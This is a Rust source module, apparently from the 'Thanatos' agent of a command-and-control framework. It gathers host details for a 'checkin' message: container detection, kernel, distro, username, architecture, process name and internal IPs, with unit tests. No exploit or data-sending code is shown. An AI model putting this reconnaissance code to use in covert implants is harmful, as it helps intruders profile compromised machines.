use std::io::{BufRead, BufReader};

use crate::errors::ThanatosError;
use ffiwrappers::linux::{
    ifaddrs::IfAddrsList,
    socket::SockAddr,
    uname::{self, UtsName},
    user::UserInfo,
};
use thanatos_protos::msg::checkin::{ip_type, Architecture, ContainerEnv, IpType};

mod dnsname;
pub use dnsname::{domain, hostname};

mod integrity;

mod selinux;

pub fn container_environment() -> ContainerEnv {
    if let Ok(readdir) = std::fs::read_dir("/") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".dockerenv" {
                return ContainerEnv::Docker;
            }
        }
    }

    if let Ok(readdir) = std::fs::read_dir("/run") {
        for entry in readdir.flatten() {
            if entry.file_name() == ".containerenv" {
                return ContainerEnv::Container;
            }
        }
    }

    ContainerEnv::None
}

pub fn kernel() -> Option<String> {
    UtsName::new().ok().map(|u| u.release().to_owned())
}

pub fn distro() -> Option<String> {
    let f = std::fs::File::open("/etc/os-release").ok()?;
    let reader = BufReader::new(f);

    let mut name = String::new();
    let mut version = String::new();

    for line in reader.lines().map_while(Result::ok) {
        if line.starts_with("NAME=") {
            let s = line.split('=');
            if let Some(name_quoted) = s.last() {
                name = name_quoted[1..name_quoted.len() - 1].to_string();
            }
            continue;
        }

        if line.starts_with("VERSION=") {
            let s = line.split('=');
            if let Some(version_quoted) = s.last() {
                version = version_quoted[1..version_quoted.len() - 1].to_string();
            }

            continue;
        }

        if line.starts_with("PRETTY_NAME=") {
            let s = line.split('=');
            if let Some(pretty_name_quoted) = s.last() {
                return Some(pretty_name_quoted[1..pretty_name_quoted.len() - 1].to_string());
            }

            continue;
        }
    }

    if name.is_empty() && version.is_empty() {
        None
    } else {
        Some(format!("{} {}", name, version))
    }
}

pub fn username() -> Result<String, ThanatosError> {
    UserInfo::current_user()
        .map(|userinfo| userinfo.username().to_string())
        .map_err(ThanatosError::FfiError)
}

pub fn architecture() -> Option<Architecture> {
    match uname::UtsName::new().ok()?.machine() {
        "x86_64" => Some(Architecture::X8664),
        "x86" => Some(Architecture::X86),
        _ => None,
    }
}

pub fn process_name() -> Result<String, ThanatosError> {
    std::fs::read_to_string("/proc/self/comm").map_err(|e| ThanatosError::IoError(e.kind()))
}

pub fn internal_ips() -> Result<Vec<IpType>, ThanatosError> {
    let interfaces = IfAddrsList::new().map_err(ThanatosError::FfiError)?;

    Ok(interfaces
        .iter()
        .flat_map(|interface| {
            interface.ifa_addr().map(|address| match address {
                SockAddr::AfInet(ipv4addr) => IpType {
                    ip: Some(ip_type::Ip::Ipv4(ipv4addr.sin_addr().s_addr)),
                },
                SockAddr::AfInet6(ipv6addr) => IpType {
                    ip: Some(ip_type::Ip::Ipv6(ipv6addr.sin6_addr().s6_addr.to_vec())),
                },
            })
        })
        .collect::<Vec<IpType>>())
}

#[cfg(test)]
mod tests {
    #[test]
    fn kernel_ok() {
        super::kernel().expect("kernel() returned a None value");
    }

    #[test]
    fn distro_ok() {
        super::distro().expect("distro() returned a None value");
    }

    #[test]
    fn username_ok() {
        super::username().unwrap();
    }

    #[test]
    fn process_name_ok() {
        super::process_name().unwrap();
    }

    #[test]
    #[ignore = "Pending rewrite"]
    fn internal_ips() {
        let ips = super::internal_ips().unwrap();
        dbg!(ips);
    }
}
